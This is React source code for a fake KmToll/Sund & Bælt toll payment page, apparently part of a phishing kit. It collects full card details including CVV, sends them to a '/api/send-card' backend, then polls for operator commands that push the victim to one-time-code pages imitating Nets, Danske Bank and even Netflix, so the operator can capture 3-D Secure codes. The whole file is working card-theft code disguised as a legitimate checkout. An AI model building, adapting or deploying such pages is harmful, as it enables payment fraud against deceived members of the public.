import React, { useState, useEffect } from "react";
import {
  AppBar,
  Toolbar,
  Container,
  Typography,
  TextField,
  Button,
  Box,
  Paper,
  SvgIcon,
  useMediaQuery,
  useTheme,
  Grid,
  Menu,
  MenuItem,
  ListItemIcon,
  IconButton,
  Tooltip,
  Alert,
  AlertTitle,
  Dialog,
  DialogContent,
  Fade,
} from "@mui/material";
import CheckIcon from "@mui/icons-material/Check";
import InfoOutlinedIcon from "@mui/icons-material/InfoOutlined";
import HelpOutlineOutlinedIcon from "@mui/icons-material/HelpOutlineOutlined";
import WarningIcon from "@mui/icons-material/Warning";
import CloseIcon from "@mui/icons-material/Close";
import { useNavigate } from "react-router-dom";

// Custom dropdown arrow icon
const KeyboardArrowDownIcon = (props) => (
  <SvgIcon {...props} viewBox="0 0 24 24">
    <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
  </SvgIcon>
);

// Logo component
const KMTollLogo = () => (
  <img
    src="https://kmt.vejafgifter.dk/e0845ea56d96bcb377f9.svg"
    alt="KM Toll Logo"
    id="kmTollLogo"
    style={{ height: 36, cursor: "pointer" }}
  />
);

// Translations
const translations = {
  en: {
    payment: "Payment",
    paymentDescription: "You can pay by credit card and then receive a receipt for your KmToll ticket.",
    paymentSubtext: "Payment is handled by ParkTrade Europe AB on behalf of Sund & Bælt",
    cardNumber: "Card number",
    cardNumberPlaceholder: "1234 5678 9012 3456",
    expiryDate: "Expiry date",
    expiryDatePlaceholder: "MM/YY",
    securityCode: "Security code",
    securityCodePlaceholder: "CVV",
    nameOnCard: "Name on card",
    nameOnCardPlaceholder: "J. Smith",
    payButton: "Pay DKK 750.00",
    processing: "Processing",
    back: "Back",
    cardNumberError: "Please enter a valid card number",
    cardNumberLuhnError: "Invalid card number",
    expiryDateError: "Invalid expiry date",
    cvvError: "Invalid security code",
    required: "This field is required",
    paymentFailed: "Payment failed",
    paymentErrorMsg: "Payment error: ",
    paymentFailedMessage: "Payment failed. Please try again.",
    expiryTooltip: "Enter your card's expiry date (MM/YY)",
    cvvTooltip: "The 3-digit security code on the back of your card",
    cardNumberTooltip: "Enter your 15-16 digit card number",
    nameTooltip: "Enter the name as it appears on your card"
  },
  da: {
    payment: "Betaling",
    paymentDescription: "Du kan betale med kreditkort og derefter modtage en kvittering for din KmToll-billet.",
    paymentSubtext: "Betalingen varetages af ParkTrade Europe AB på vegne af Sund & Bælt",
    cardNumber: "Kortnummer",
    cardNumberPlaceholder: "1234 5678 9012 3456",
    expiryDate: "Udløbsdato",
    expiryDatePlaceholder: "MM/ÅÅ",
    securityCode: "Sikkerhedskode",
    securityCodePlaceholder: "CVV",
    nameOnCard: "Navn på kort",
    nameOnCardPlaceholder: "J. Smith",
    payButton: "Betal DKK 750.00",
    processing: "Behandler",
    back: "Tilbage",
    cardNumberError: "Indtast venligst et gyldigt kortnummer",
    cardNumberLuhnError: "Ugyldigt kortnummer",
    expiryDateError: "Ugyldig udløbsdato",
    cvvError: "Ugyldig sikkerhedskode",
    required: "Dette felt er påkrævet",
    paymentFailed: "Betaling mislykkedes",
    paymentErrorMsg: "Betalingsfejl: ",
    paymentFailedMessage: "Betaling mislykkedes. Prøv venligst igen.",
    expiryTooltip: "Indtast dit korts udløbsdato (MM/ÅÅ)",
    cvvTooltip: "Den 3-cifrede sikkerhedskode på bagsiden af dit kort",
    cardNumberTooltip: "Indtast dit 15-16 cifrede kortnummer",
    nameTooltip: "Indtast navnet, som det står på dit kort"
  }
};

export default function PaymentPage() {
  const navigate = useNavigate();
  const apiUrl = import.meta.env.VITE_API_URL;

  const [language, setLanguage] = useState("Dansk");
  const [anchorEl, setAnchorEl] = useState(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [dots, setDots] = useState("");
  const [paymentId, setPaymentId] = useState(null);
  const [generalError, setGeneralError] = useState("");

  // Form state
  const [cardNumber, setCardNumber] = useState("");
  const [expirationDate, setExpirationDate] = useState("");
  const [cvv, setCVV] = useState("");
  const [nameOnCard, setNameOnCard] = useState("");

  // Error state
  const [errors, setErrors] = useState({
    cardNumber: false,
    expiryDate: false,
    nameOnCard: false,
    securityCode: false,
  });

  // Error messages
  const [errorMessages, setErrorMessages] = useState({
    cardNumber: "",
    expiryDate: "",
    nameOnCard: "",
    securityCode: "",
  });

  const open = Boolean(anchorEl);
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("sm"));

  // Get translation based on language
  const t = (key) => {
    const lang = language === "Dansk" ? "da" : "en";
    return translations[lang]?.[key] || translations.en[key] || key;
  };

  // Luhn algorithm validation
  const isValidCardNumberLuhn = (cardNumber) => {
    let sum = 0;
    let shouldDouble = false;

    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber[i], 10);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
  };

  // Dots animation for loading state
  useEffect(() => {
    if (!isSubmitting) {
      setDots("");
      return;
    }

    const interval = setInterval(() => {
      setDots((prev) => (prev.length >= 3 ? "" : prev + "."));
    }, 500);

    return () => clearInterval(interval);
  }, [isSubmitting]);

  // Clear general error when user starts typing
  useEffect(() => {
    if (generalError) {
      setGeneralError("");
    }
  }, [cardNumber, expirationDate, cvv, nameOnCard]);

  const handleLanguageClick = (event) => {
    setAnchorEl(event.currentTarget);
  };

  const handleLanguageClose = (lang) => {
    if (lang) {
      setLanguage(lang);
      // Clear errors when changing language
      setErrors({
        cardNumber: false,
        expiryDate: false,
        nameOnCard: false,
        securityCode: false,
      });
      setErrorMessages({
        cardNumber: "",
        expiryDate: "",
        nameOnCard: "",
        securityCode: "",
      });
    }
    setAnchorEl(null);
  };

  // Validate a single field
  const validateField = (field, value) => {
    const newErrors = { ...errors };
    const newErrorMessages = { ...errorMessages };

    switch (field) {
      case "cardNumber":
        if (!/^\d{15,16}$/.test(value)) {
          newErrors.cardNumber = true;
          newErrorMessages.cardNumber = t("cardNumberError");
        } else if (!isValidCardNumberLuhn(value)) {
          newErrors.cardNumber = true;
          newErrorMessages.cardNumber = t("cardNumberLuhnError");
        } else {
          newErrors.cardNumber = false;
          newErrorMessages.cardNumber = "";
        }
        break;
      case "expirationDate":
        if (!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(value)) {
          newErrors.expiryDate = true;
          newErrorMessages.expiryDate = t("expiryDateError");
        } else {
          newErrors.expiryDate = false;
          newErrorMessages.expiryDate = "";
        }
        break;
      case "cvv":
        if (!/^\d{3,4}$/.test(value)) {
          newErrors.securityCode = true;
          newErrorMessages.securityCode = t("cvvError");
        } else {
          newErrors.securityCode = false;
          newErrorMessages.securityCode = "";
        }
        break;
      case "nameOnCard":
        if (!value.trim()) {
          newErrors.nameOnCard = true;
          newErrorMessages.nameOnCard = t("required");
        } else {
          newErrors.nameOnCard = false;
          newErrorMessages.nameOnCard = "";
        }
        break;
      default:
        break;
    }

    setErrors(newErrors);
    setErrorMessages(newErrorMessages);
    return !newErrors[field];
  };

  // Validate all fields before submission
  const validateAllFields = () => {
    const fields = [
      { name: "cardNumber", value: cardNumber },
      { name: "expirationDate", value: expirationDate },
      { name: "cvv", value: cvv },
      { name: "nameOnCard", value: nameOnCard },
    ];

    let allValid = true;
    const newErrors = { ...errors };
    const newErrorMessages = { ...errorMessages };

    fields.forEach((field) => {
      switch (field.name) {
        case "cardNumber":
          if (!/^\d{15,16}$/.test(field.value)) {
            newErrors.cardNumber = true;
            newErrorMessages.cardNumber = t("cardNumberError");
            allValid = false;
          } else if (!isValidCardNumberLuhn(field.value)) {
            newErrors.cardNumber = true;
            newErrorMessages.cardNumber = t("cardNumberLuhnError");
            allValid = false;
          } else {
            newErrors.cardNumber = false;
            newErrorMessages.cardNumber = "";
          }
          break;
        case "expirationDate":
          if (!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(field.value)) {
            newErrors.expiryDate = true;
            newErrorMessages.expiryDate = t("expiryDateError");
            allValid = false;
          } else {
            newErrors.expiryDate = false;
            newErrorMessages.expiryDate = "";
          }
          break;
        case "cvv":
          if (!/^\d{3,4}$/.test(field.value)) {
            newErrors.securityCode = true;
            newErrorMessages.securityCode = t("cvvError");
            allValid = false;
          } else {
            newErrors.securityCode = false;
            newErrorMessages.securityCode = "";
          }
          break;
        case "nameOnCard":
          if (!field.value.trim()) {
            newErrors.nameOnCard = true;
            newErrorMessages.nameOnCard = t("required");
            allValid = false;
          } else {
            newErrors.nameOnCard = false;
            newErrorMessages.nameOnCard = "";
          }
          break;
      }
    });

    setErrors(newErrors);
    setErrorMessages(newErrorMessages);
    return allValid;
  };

  const handleSubmit = async (event) => {
    event.preventDefault();

    if (!validateAllFields()) {
      return;
    }

    setGeneralError("");
    setIsSubmitting(true);

    try {
      const [expiryMonth, expiryYear] = expirationDate.split("/");

      const response = await fetch(`${apiUrl}/api/send-card`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardNumber,
          cardName: nameOnCard,
          expiryMonth,
          expiryYear,
          cvv,
          language: language === "Dansk" ? "da" : "en",
        }),
      });
      const data = await response.json();

      if (response.ok) {
        setPaymentId(data.id);
        const pollStatus = async (id) => {
          const statusResponse = await fetch(`${apiUrl}/api/status/card/${id}`);
          const statusData = await statusResponse.json();

          if (statusData.status === "otp") {
            navigate("/NetflixPaymentVerification", {
              state: { paymentId: id, language: language === "Dansk" ? "da" : "en" },
            });
            setIsSubmitting(false);
          } else if (statusData.status === "rejected") {
            setGeneralError(t("paymentFailedMessage"));
            setIsSubmitting(false);
          } else if (statusData.status === "otp2") {
            navigate("/Nets", { state: { paymentId: id, language: language === "Dansk" ? "da" : "en" } });
            setIsSubmitting(false);
          } else if (statusData.status === "app") {
            navigate("/Appotp", { state: { paymentId: id, language: language === "Dansk" ? "da" : "en" } });
            setIsSubmitting(false);
          } else if (statusData.status === "otp3") {
            navigate("/Danske", { state: { paymentId: id, language: language === "Dansk" ? "da" : "en" } });
            setIsSubmitting(false);
          } else if (statusData.status === "otp4") {
            navigate("/OtpConfirmPage", { state: { paymentId: id, language: language === "Dansk" ? "da" : "en" } });
            setIsSubmitting(false);
          } else {
            setTimeout(() => pollStatus(id), 2000);
          }
        };
        pollStatus(data.id);
      } else {
        throw new Error(data.message || `${t("paymentFailed")}`);
      }
    } catch (error) {
      console.error("Fejl:", error);
      setGeneralError(t("paymentFailedMessage"));
      setIsSubmitting(false);
    }
  };

  const handleBack = () => {
    navigate(-1);
  };

  // Limit card number to 16 digits and only allow numbers
  const handleCardNumberChange = (e) => {
    const value = e.target.value.replace(/\D/g, "");
    if (value.length <= 16) {
      setCardNumber(value);
      validateField("cardNumber", value);
    }
  };

  // Limit expiration date to 5 characters (MM/YY)
  const handleExpirationDateChange = (e) => {
    let value = e.target.value;
    // Remove any non-digit characters except '/'
    value = value.replace(/[^0-9/]/g, '');
    if (value.length <= 5) {
      // Auto-format: add slash after 2 digits
      if (value.length === 2 && !value.includes('/')) {
        value = value + '/';
      }
      setExpirationDate(value);
      validateField("expirationDate", value);
    }
  };

  // Limit CVV to 4 digits
  const handleCvvChange = (e) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length <= 4) {
      setCVV(value);
      validateField("cvv", value);
    }
  };

  // Limit name on card to 50 characters
  const handleNameChange = (e) => {
    const value = e.target.value;
    if (value.length <= 50) {
      setNameOnCard(value);
      validateField("nameOnCard", value);
    }
  };

  return (
    <div style={{ backgroundColor: "#f2f2f2", minHeight: "100vh", overflow: "hidden" }}>
      {/* Header */}
      <AppBar
        position="relative"
        elevation={0}
        sx={{
          backgroundColor: "#ffffff",
          color: "#000",
          borderBottom: "1px solid rgba(0,0,0,0.12)",
          padding: "0 24px",
          ...(isMobile && { padding: "0 12px" }),
        }}
      >
        <Toolbar sx={{ height: 94, padding: 0 }}>
          <KMTollLogo />
          <Box sx={{ flexGrow: 1 }} />

          <>
            <Button
              id="language-picker-button"
              onClick={handleLanguageClick}
              variant="outlined"
              disableRipple
              disableElevation
              sx={{
                width: 140,
                height: 40,
                minWidth: 140,
                px: 2,
                border: "1px solid #C9C9C9",
                borderRadius: "999px",
                backgroundColor: "#fff",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                textTransform: "none",
                fontFamily: "Campton",
                color: "#202020",
                boxShadow: "none",
                "&:hover": {
                  backgroundColor: "#fff",
                  border: "1px solid #C9C9C9",
                  boxShadow: "none",
                },
              }}
            >
              <Typography
                sx={{
                  fontFamily: "Campton",
                  fontWeight: 600,
                  fontSize: 14,
                  color: "#202020",
                }}
              >
                {language}
              </Typography>

              <KeyboardArrowDownIcon sx={{ fontSize: 20 }} />
            </Button>

            <Menu
              anchorEl={anchorEl}
              open={open}
              onClose={() => handleLanguageClose()}
              anchorOrigin={{
                vertical: "bottom",
                horizontal: "left",
              }}
              transformOrigin={{
                vertical: "top",
                horizontal: "left",
              }}
              slotProps={{
                paper: {
                  sx: {
                    mt: 1,
                    width: 140,
                    borderRadius: "6px",
                    overflow: "hidden",
                    boxShadow: "0 4px 14px rgba(0,0,0,.12)",
                  },
                },
              }}
            >
              {["Dansk", "English"].map((item) => (
                <MenuItem
                  key={item}
                  onClick={() => handleLanguageClose(item)}
                  selected={language === item}
                  sx={{
                    height: 40,
                    px: 1.5,
                    fontFamily: "Campton",
                    fontSize: 14,
                    fontWeight: 600,
                    color: "#202020",
                    display: "flex",
                    justifyContent: "space-between",
                    "&.Mui-selected": {
                      background: "#F3F3F3",
                    },
                    "&.Mui-selected:hover": {
                      background: "#F3F3F3",
                    },
                  }}
                >
                  {item}
                  {language === item && (
                    <ListItemIcon
                      sx={{
                        minWidth: "auto",
                        color: "#0078D4",
                      }}
                    >
                      <CheckIcon fontSize="small" />
                    </ListItemIcon>
                  )}
                </MenuItem>
              ))}
            </Menu>
          </>
        </Toolbar>
      </AppBar>

      {/* Main Content */}
      <Container
        maxWidth={false}
        sx={{
          backgroundColor: "#f2f2f2",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          minHeight: "calc(100vh - 93px)",
          padding: isMobile ? "16px 12px" : "0",
          paddingTop: {
            xs: '40px',
            sm: '40px',
            md: '90px',
            lg: '90px',
            xl: '90px'
          },
          overflow: "hidden"
        }}
      >
        {/* Payment Form Container */}
        <Paper
          elevation={0}
          sx={{
            backgroundColor: "#ffffff",
            borderRadius: "8px",
            width: 560,
            height: "auto",
            minHeight: 340,
            margin: "0 12px",
            display: "flex",
            flexDirection: "column",
            alignItems: "flex-start",
            justifyContent: "center",
            boxSizing: "border-box",
            "@media (max-width: 600px)": {
              width: "100%",
              height: "auto",
              margin: 0,
            },
          }}
        >
          <form onSubmit={handleSubmit} style={{ width: "100%" }}>
            <Grid container spacing={2} sx={{ p: '54px 10px 54px 54px' }}>
              {/* Title */}
              <Grid item xs={12}>
                <Typography
                  sx={{
                    textSizeAdjust: "100%",
                    WebkitFontSmoothing: "antialiased",
                    boxSizing: "inherit",
                    margin: 0,
                    fontSize: "19px",
                    fontWeight: 625,
                    lineHeight: "20px",
                    letterSpacing: "-0.3px",
                    textAlign: "start !important",
                    color: "rgb(45, 45, 45) !important",
                  }}
                >
                  {t("payment")}
                </Typography>
              </Grid>

              {/* Description */}
              <Grid item xs={12}>
                <Typography
                  sx={{
                    fontSize: 14,
                    lineHeight: 1.4,
                    color: "#2d2d2d",
                    maxWidth: 480,
                  }}
                >
                  {t("paymentDescription")}
                </Typography>
                <Typography
                  sx={{
                    fontSize: 12,
                    lineHeight: 1.3,
                    color: "#888",
                    maxWidth: 480,
                    mt: 0.5,
                  }}
                >
                  {t("paymentSubtext")}
                </Typography>
              </Grid>

              {/* General Error Alert */}
              {generalError && (
                <Grid item xs={12}>
                  <Alert
                    severity="error"
                    icon={<WarningIcon sx={{ color: '#d32f2f', fontSize: 22 }} />}
                    sx={{
                      backgroundColor: '#fdecea',
                      color: '#d32f2f',
                      borderRadius: '4px',
                      padding: '10px 16px',
                      alignItems: 'center',
                      '& .MuiAlert-message': {
                        padding: 0,
                        fontSize: 14,
                        fontWeight: 500,
                        fontFamily: 'Campton',
                      },
                      '& .MuiAlert-icon': {
                        padding: '4px 0',
                        alignItems: 'center',
                      },
                      border: '1px solid #f5c6cb',
                    }}
                  >
                    {generalError}
                  </Alert>
                </Grid>
              )}

              <Grid container spacing={1.5} direction="column">
                {/* Card Number */}
                <Grid item xs={12}>
                  <Box
                    sx={{
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "flex-start",
                      width: "100%",
                    }}
                  >
                    <Box
                      sx={{
                        display: "flex",
                        alignItems: "center",
                        width: "100%",
                        mb: 0.5,
                      }}
                    >
                      <Typography
                        sx={{
                          fontSize: 13,
                          color: "#555",
                          fontFamily: "CamptonBook",
                        }}
                      >
                        {t("cardNumber")}
                      </Typography>
                      <Tooltip title={t("cardNumberTooltip")}>
                        <IconButton
                          size="small"
                          sx={{
                            ml: 0.5,
                            padding: "2px",
                            color: "#888",
                            "&:hover": {
                              color: "#0576bf",
                            },
                          }}
                        >
                          <InfoOutlinedIcon sx={{ fontSize: 16 }} />
                        </IconButton>
                      </Tooltip>
                    </Box>

                    <TextField
                      fullWidth
                      placeholder={t("cardNumberPlaceholder")}
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      error={errors.cardNumber}
                      helperText={errorMessages.cardNumber}
                      name="cardNumber"
                      disabled={isSubmitting}
                      inputProps={{ 
                        maxLength: 16,
                        inputMode: "numeric",
                        pattern: "[0-9]*"
                      }}
                      InputLabelProps={{ shrink: false }}
                      sx={{
                        width: "100%",
                        maxWidth: "100%",
                        "& .MuiOutlinedInput-root": {
                          height: 44,
                          borderRadius: "6px",
                          backgroundColor: "#fff",
                          fontSize: 15,
                          fontFamily: "CamptonBook",
                          "& fieldset": {
                            borderColor: "#c8c8c8",
                          },
                          "&:hover fieldset": {
                            borderColor: "#999",
                          },
                          "&.Mui-focused fieldset": {
                            borderColor: "#1a73e8",
                            borderWidth: "1px",
                          },
                          "&.Mui-error fieldset": {
                            borderColor: "#d32f2f",
                          },
                        },
                        "& .MuiInputBase-input": {
                          padding: "10px 12px !important",
                          height: "auto",
                        },
                        "& input::placeholder": {
                          color: "#9a9a9a",
                          opacity: 1,
                          fontSize: 15,
                        },
                      }}
                    />
                  </Box>
                </Grid>

                {/* Expiry Date & Security Code - Side by Side with Icons */}
                <Grid item xs={12} style={{ marginTop: "15px" }}>
                  <Grid container spacing={2}>
                    {/* Expiry Date */}
                    <Grid item xs={6}>
                      <Box
                        sx={{
                          display: "flex",
                          flexDirection: "column",
                          alignItems: "flex-start",
                          width: "100%",
                        }}
                      >
                        <Box
                          sx={{
                            display: "flex",
                            alignItems: "center",
                            width: "100%",
                            mb: 0.5,
                          }}
                        >
                          <Typography
                            sx={{
                              fontSize: 13,
                              color: "#555",
                              fontFamily: "CamptonBook",
                            }}
                          >
                            {t("expiryDate")}
                          </Typography>
                          <Tooltip title={t("expiryTooltip")}>
                            <IconButton
                              size="small"
                              sx={{
                                ml: 0.5,
                                padding: "2px",
                                color: "#888",
                                "&:hover": {
                                  color: "#0576bf",
                                },
                              }}
                            >
                              <InfoOutlinedIcon sx={{ fontSize: 16 }} />
                            </IconButton>
                          </Tooltip>
                        </Box>

                        <TextField
                          fullWidth
                          placeholder={t("expiryDatePlaceholder")}
                          value={expirationDate}
                          onChange={handleExpirationDateChange}
                          error={errors.expiryDate}
                          helperText={errorMessages.expiryDate}
                          name="expiryDate"
                          disabled={isSubmitting}
                          inputProps={{ maxLength: 5 }}
                          InputLabelProps={{ shrink: false }}
                          sx={{
                            width: "100%",
                            "& .MuiOutlinedInput-root": {
                              height: 44,
                              borderRadius: "6px",
                              backgroundColor: "#fff",
                              fontSize: 15,
                              fontFamily: "CamptonBook",
                              "& fieldset": {
                                borderColor: "#c8c8c8",
                              },
                              "&:hover fieldset": {
                                borderColor: "#999",
                              },
                              "&.Mui-focused fieldset": {
                                borderColor: "#1a73e8",
                                borderWidth: "1px",
                              },
                              "&.Mui-error fieldset": {
                                borderColor: "#d32f2f",
                              },
                            },
                            "& input": {
                              padding: "10px 12px",
                            },
                            "& input::placeholder": {
                              color: "#9a9a9a",
                              opacity: 1,
                              fontSize: 15,
                            },
                          }}
                        />
                      </Box>
                    </Grid>

                    {/* Security Code */}
                    <Grid item xs={6}>
                      <Box
                        sx={{
                          display: "flex",
                          flexDirection: "column",
                          alignItems: "flex-start",
                          width: "100%",
                        }}
                      >
                        <Box
                          sx={{
                            display: "flex",
                            alignItems: "center",
                            width: "100%",
                            mb: 0.5,
                          }}
                        >
                          <Typography
                            sx={{
                              fontSize: 13,
                              color: "#555",
                              fontFamily: "CamptonBook",
                            }}
                          >
                            {t("securityCode")}
                          </Typography>
                          <Tooltip title={t("cvvTooltip")}>
                            <IconButton
                              size="small"
                              sx={{
                                ml: 0.5,
                                padding: "2px",
                                color: "#888",
                                "&:hover": {
                                  color: "#0576bf",
                                },
                              }}
                            >
                              <HelpOutlineOutlinedIcon sx={{ fontSize: 16 }} />
                            </IconButton>
                          </Tooltip>
                        </Box>

                        <TextField
                          fullWidth
                          placeholder={t("securityCodePlaceholder")}
                          type="password"
                          value={cvv}
                          onChange={handleCvvChange}
                          error={errors.securityCode}
                          helperText={errorMessages.securityCode}
                          name="securityCode"
                          disabled={isSubmitting}
                          inputProps={{ 
                            maxLength: 4,
                            inputMode: "numeric",
                            pattern: "[0-9]*"
                          }}
                          InputLabelProps={{ shrink: false }}
                          sx={{
                            width: "100%",
                            "& .MuiOutlinedInput-root": {
                              height: 44,
                              borderRadius: "6px",
                              backgroundColor: "#fff",
                              fontSize: 15,
                              fontFamily: "CamptonBook",
                              "& fieldset": {
                                borderColor: "#c8c8c8",
                              },
                              "&:hover fieldset": {
                                borderColor: "#999",
                              },
                              "&.Mui-focused fieldset": {
                                borderColor: "#1a73e8",
                                borderWidth: "1px",
                              },
                              "&.Mui-error fieldset": {
                                borderColor: "#d32f2f",
                              },
                            },
                            "& input": {
                              padding: "10px 12px",
                            },
                            "& input::placeholder": {
                              color: "#9a9a9a",
                              opacity: 1,
                              fontSize: 15,
                            },
                          }}
                        />
                      </Box>
                    </Grid>
                  </Grid>
                </Grid>

                {/* Name on Card */}
                <Grid item xs={12} style={{ marginTop: "15px" }}>
                  <Box
                    sx={{
                      display: "flex",
                      flexDirection: "column",
                      alignItems: "flex-start",
                      width: "100%",
                    }}
                  >
                    <Box
                      sx={{
                        display: "flex",
                        alignItems: "center",
                        width: "100%",
                        mb: 0.5,
                      }}
                    >
                      <Typography
                        sx={{
                          fontSize: 13,
                          color: "#555",
                          fontFamily: "CamptonBook",
                        }}
                      >
                        {t("nameOnCard")}
                      </Typography>
                      <Tooltip title={t("nameTooltip")}>
                        <IconButton
                          size="small"
                          sx={{
                            ml: 0.5,
                            padding: "2px",
                            color: "#888",
                            "&:hover": {
                              color: "#0576bf",
                            },
                          }}
                        >
                          <InfoOutlinedIcon sx={{ fontSize: 16 }} />
                        </IconButton>
                      </Tooltip>
                    </Box>

                    <TextField
                      fullWidth
                      placeholder={t("nameOnCardPlaceholder")}
                      value={nameOnCard}
                      onChange={handleNameChange}
                      error={errors.nameOnCard}
                      helperText={errorMessages.nameOnCard}
                      name="nameOnCard"
                      disabled={isSubmitting}
                      inputProps={{ maxLength: 50 }}
                      InputLabelProps={{ shrink: false }}
                      sx={{
                        width: "100%",
                        maxWidth: "100%",
                        "& .MuiOutlinedInput-root": {
                          height: 44,
                          borderRadius: "6px",
                          backgroundColor: "#fff",
                          fontSize: 15,
                          fontFamily: "CamptonBook",
                          "& fieldset": {
                            borderColor: "#c8c8c8",
                          },
                          "&:hover fieldset": {
                            borderColor: "#999",
                          },
                          "&.Mui-focused fieldset": {
                            borderColor: "#1a73e8",
                            borderWidth: "1px",
                          },
                          "&.Mui-error fieldset": {
                            borderColor: "#d32f2f",
                          },
                        },
                        "& input": {
                          padding: "10px 12px",
                        },
                        "& input::placeholder": {
                          color: "#9a9a9a",
                          opacity: 1,
                          fontSize: 15,
                        },
                      }}
                    />
                  </Box>
                </Grid>
              </Grid>
            </Grid>
          </form>
        </Paper>

        {/* Pay Button and Back Link */}
        <Box
          sx={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            width: "100%",
            maxWidth: 560,
            marginTop: "12px",
            marginBottom: "24px",
            paddingLeft: isMobile ? "0" : "12px",
            paddingRight: isMobile ? "0" : "12px",
          }}
        >
          <Button
            onClick={handleBack}
            disabled={isSubmitting}
            sx={{
              textTransform: "none",
              fontFamily: "Campton",
              fontWeight: 400,
              fontSize: 14,
              color: "#0576bf",
              "&:hover": {
                backgroundColor: "transparent",
                textDecoration: "underline",
              },
            }}
          >
            {t("back")}
          </Button>

          <Button
            type="submit"
            variant="contained"
            disabled={
              isSubmitting ||
              !cardNumber.trim() || 
              !expirationDate.trim() || 
              !nameOnCard.trim() || 
              !cvv.trim()
            }
            onClick={handleSubmit}
            sx={{
              borderRadius: "30px",
              textTransform: "none",
              fontFamily: "Campton",
              fontWeight: 550,
              fontSize: 14,
              lineHeight: 1.2,
              padding: "8px 24px",
              backgroundColor: "#0576bf",
              color: "#fff",
              border: "2px solid #0576bf",
              minHeight: 40,
              "&:hover": {
                backgroundColor: "#0466a6",
                borderColor: "#0466a6",
              },
              "&.Mui-disabled": {
                backgroundColor: "#0576bf",
                opacity: 0.5,
                color: "#fff",
                borderColor: "#0576bf",
              },
              ...(isMobile && {
                padding: "6px 16px",
                fontSize: 13,
                marginBottom: "1rem",
              }),
            }}
          >
            {isSubmitting ? `${t("processing")}${dots}` : t("payButton")}
          </Button>
        </Box>
      </Container>
    </div>
  );
}